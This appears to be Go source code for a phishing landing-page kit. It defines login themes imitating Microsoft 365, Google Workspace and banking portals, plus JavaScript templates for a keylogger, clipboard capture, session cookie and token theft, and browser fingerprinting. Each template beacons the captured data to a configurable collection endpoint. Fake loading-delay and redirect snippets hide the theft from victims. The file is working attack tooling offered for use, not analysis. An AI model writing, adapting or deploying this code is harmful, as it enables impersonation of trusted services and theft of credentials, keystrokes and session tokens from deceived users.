package landingpage

// ThemeDTO describes a built-in or custom theme.
type ThemeDTO struct {
	ID          string         `json:"id"`
	Name        string         `json:"name"`
	Description string         `json:"description"`
	Category    string         `json:"category"`
	Styles      map[string]any `json:"styles"`
}

// GetBuiltInThemes returns the 5 built-in enterprise themes.
func GetBuiltInThemes() []ThemeDTO {
	return []ThemeDTO{
		{
			ID:          "theme-microsoft",
			Name:        "Microsoft / Office 365",
			Description: "Blue-based theme matching Microsoft's enterprise style.",
			Category:    "enterprise",
			Styles: map[string]any{
				"primary_color":    "#0078d4",
				"secondary_color":  "#106ebe",
				"background_color": "#f3f2f1",
				"text_color":       "#323130",
				"font_family":      "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
				"border_radius":    "2px",
				"input_border":     "1px solid #8a8886",
				"button_style":     "background:#0078d4;color:#fff;border:none;border-radius:2px;padding:8px 20px;font-size:14px;",
				"heading_color":    "#323130",
				"link_color":       "#0078d4",
				"css": `body { background: #f3f2f1; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #323130; }
.login-container { background: #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.2); padding: 44px; max-width: 440px; }
input { border: 1px solid #8a8886; border-radius: 2px; padding: 8px 10px; font-size: 14px; }
input:focus { border-color: #0078d4; outline: none; }
button[type="submit"] { background: #0078d4; border-radius: 2px; font-weight: 600; }`,
			},
		},
		{
			ID:          "theme-google",
			Name:        "Google Workspace",
			Description: "Clean white theme matching Google's enterprise style.",
			Category:    "enterprise",
			Styles: map[string]any{
				"primary_color":    "#1a73e8",
				"secondary_color":  "#5f6368",
				"background_color": "#ffffff",
				"text_color":       "#202124",
				"font_family":      "'Google Sans', Roboto, Arial, sans-serif",
				"border_radius":    "4px",
				"input_border":     "1px solid #dadce0",
				"button_style":     "background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;",
				"heading_color":    "#202124",
				"link_color":       "#1a73e8",
				"css": `body { background: #fff; font-family: 'Google Sans', Roboto, Arial, sans-serif; color: #202124; }
.login-container { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px; max-width: 450px; }
input { border: 1px solid #dadce0; border-radius: 4px; padding: 13px 15px; font-size: 16px; }
input:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 0 1px #1a73e8; }
button[type="submit"] { background: #1a73e8; border-radius: 4px; font-weight: 500; letter-spacing: 0.25px; }`,
			},
		},
		{
			ID:          "theme-corporate",
			Name:        "Generic Corporate",
			Description: "Professional neutral theme for generic enterprise use.",
			Category:    "enterprise",
			Styles: map[string]any{
				"primary_color":    "#2c3e50",
				"secondary_color":  "#3498db",
				"background_color": "#ecf0f1",
				"text_color":       "#2c3e50",
				"font_family":      "'Helvetica Neue', Helvetica, Arial, sans-serif",
				"border_radius":    "4px",
				"input_border":     "1px solid #bdc3c7",
				"button_style":     "background:#2c3e50;color:#fff;border:none;border-radius:4px;padding:12px 24px;font-size:14px;",
				"heading_color":    "#2c3e50",
				"link_color":       "#3498db",
				"css": `body { background: #ecf0f1; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; color: #2c3e50; }
.login-container { background: #fff; box-shadow: 0 1px 3px rgba(0,0,0,0.12); border-radius: 4px; padding: 40px; max-width: 420px; }
input { border: 1px solid #bdc3c7; border-radius: 4px; padding: 10px 12px; font-size: 14px; }
input:focus { border-color: #3498db; outline: none; }
button[type="submit"] { background: #2c3e50; border-radius: 4px; }`,
			},
		},
		{
			ID:          "theme-cloud",
			Name:        "Cloud Service Provider",
			Description: "Modern gradient theme for cloud service portals.",
			Category:    "enterprise",
			Styles: map[string]any{
				"primary_color":    "#6366f1",
				"secondary_color":  "#8b5cf6",
				"background_color": "#0f172a",
				"text_color":       "#f8fafc",
				"font_family":      "'Inter', -apple-system, BlinkMacSystemFont, sans-serif",
				"border_radius":    "8px",
				"input_border":     "1px solid #334155",
				"button_style":     "background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;border:none;border-radius:8px;padding:12px 24px;font-size:14px;",
				"heading_color":    "#f8fafc",
				"link_color":       "#818cf8",
				"css": `body { background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; color: #f8fafc; min-height: 100vh; }
.login-container { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 40px; max-width: 420px; }
input { background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: #f8fafc; padding: 12px 14px; font-size: 14px; }
input:focus { border-color: #6366f1; outline: none; }
button[type="submit"] { background: linear-gradient(135deg, #6366f1, #8b5cf6); border-radius: 8px; font-weight: 600; }`,
			},
		},
		{
			ID:          "theme-banking",
			Name:        "Banking / Financial",
			Description: "Trustworthy green-accented theme for financial services.",
			Category:    "enterprise",
			Styles: map[string]any{
				"primary_color":    "#1b5e20",
				"secondary_color":  "#2e7d32",
				"background_color": "#fafafa",
				"text_color":       "#212121",
				"font_family":      "'Georgia', 'Times New Roman', serif",
				"border_radius":    "2px",
				"input_border":     "1px solid #9e9e9e",
				"button_style":     "background:#1b5e20;color:#fff;border:none;border-radius:2px;padding:12px 24px;font-size:14px;",
				"heading_color":    "#1b5e20",
				"link_color":       "#2e7d32",
				"css": `body { background: #fafafa; font-family: 'Georgia', 'Times New Roman', serif; color: #212121; }
.login-container { background: #fff; border: 1px solid #e0e0e0; border-radius: 2px; padding: 40px; max-width: 400px; box-shadow: 0 1px 2px rgba(0,0,0,0.08); }
input { border: 1px solid #9e9e9e; border-radius: 2px; padding: 10px 12px; font-size: 14px; }
input:focus { border-color: #1b5e20; outline: none; }
button[type="submit"] { background: #1b5e20; border-radius: 2px; font-weight: 600; letter-spacing: 0.5px; }
h1, h2, h3 { color: #1b5e20; }`,
			},
		},
	}
}

// GetJSSnippetTemplates returns the 7 pre-built JavaScript snippet templates.
func GetJSSnippetTemplates() []JSSnippetDTO {
	return []JSSnippetDTO{
		{
			ID:          "js-keylogger",
			Name:        "Keylogger Capture",
			Description: "Captures keystrokes and sends to backend endpoint.",
			Category:    "capture",
			Code: `(function() {
  var buf = [];
  document.addEventListener('keypress', function(e) {
    buf.push({k: e.key, ts: Date.now(), el: e.target.name || e.target.id || ''});
    if (buf.length >= 10) {
      navigator.sendBeacon('{{capture_endpoint}}/keys', JSON.stringify(buf));
      buf = [];
    }
  });
})();`,
		},
		{
			ID:          "js-clipboard",
			Name:        "Clipboard Capture",
			Description: "Captures clipboard paste events.",
			Category:    "capture",
			Code: `document.addEventListener('paste', function(e) {
  var data = e.clipboardData.getData('text/plain');
  if (data) {
    navigator.sendBeacon('{{capture_endpoint}}/clipboard', JSON.stringify({
      content: data.substring(0, 1024),
      ts: Date.now(),
      field: e.target.name || e.target.id || ''
    }));
  }
});`,
		},
		{
			ID:          "js-fingerprint",
			Name:        "Browser Fingerprint Collection",
			Description: "Collects browser fingerprint data.",
			Category:    "recon",
			Code: `(function() {
  var fp = {
    ua: navigator.userAgent,
    lang: navigator.language,
    langs: navigator.languages ? navigator.languages.join(',') : '',
    platform: navigator.platform,
    cores: navigator.hardwareConcurrency || 0,
    memory: navigator.deviceMemory || 0,
    screen: screen.width + 'x' + screen.height,
    depth: screen.colorDepth,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    touch: navigator.maxTouchPoints || 0,
    cookies: navigator.cookieEnabled,
    dnt: navigator.doNotTrack
  };
  navigator.sendBeacon('{{capture_endpoint}}/fingerprint', JSON.stringify(fp));
})();`,
		},
		{
			ID:          "js-session-token",
			Name:        "Session Token Extraction",
			Description: "Extracts session cookies and tokens.",
			Category:    "capture",
			Code: `(function() {
  var tokens = {
    cookies: document.cookie,
    localStorage: {},
    sessionStorage: {}
  };
  try {
    for (var i = 0; i < localStorage.length; i++) {
      var key = localStorage.key(i);
      if (/token|session|auth|jwt/i.test(key)) {
        tokens.localStorage[key] = localStorage.getItem(key);
      }
    }
  } catch(e) {}
  try {
    for (var j = 0; j < sessionStorage.length; j++) {
      var skey = sessionStorage.key(j);
      if (/token|session|auth|jwt/i.test(skey)) {
        tokens.sessionStorage[skey] = sessionStorage.getItem(skey);
      }
    }
  } catch(e) {}
  navigator.sendBeacon('{{capture_endpoint}}/tokens', JSON.stringify(tokens));
})();`,
		},
		{
			ID:          "js-loading-delay",
			Name:        "Simulated Loading Delay",
			Description: "Shows a loading animation for configurable duration.",
			Category:    "ux",
			Code: `(function() {
  var delay = {{delay_ms || 3000}};
  var loader = document.querySelector('.loading-container, .spinner, [data-loading]');
  if (loader) {
    setTimeout(function() {
      window.location.href = '{{next_page || /success}}';
    }, delay);
  }
})();`,
		},
		{
			ID:          "js-redirect",
			Name:        "Redirect After Timeout",
			Description: "Redirects to a URL after configurable timeout.",
			Category:    "ux",
			Code: `setTimeout(function() {
  window.location.href = '{{redirect_url || /}}';
}, {{timeout_ms || 5000}});`,
		},
		{
			ID:          "js-viewport",
			Name:        "Viewport / Screen Resolution Reporting",
			Description: "Reports viewport and screen resolution to backend.",
			Category:    "recon",
			Code: `(function() {
  var info = {
    viewport: window.innerWidth + 'x' + window.innerHeight,
    screen: screen.width + 'x' + screen.height,
    dpr: window.devicePixelRatio || 1,
    orientation: screen.orientation ? screen.orientation.type : 'unknown'
  };
  navigator.sendBeacon('{{capture_endpoint}}/viewport', JSON.stringify(info));
})();`,
		},
	}
}

// JSSnippetDTO describes a pre-built JavaScript snippet template.
type JSSnippetDTO struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Description string `json:"description"`
	Category    string `json:"category"`
	Code        string `json:"code"`
}
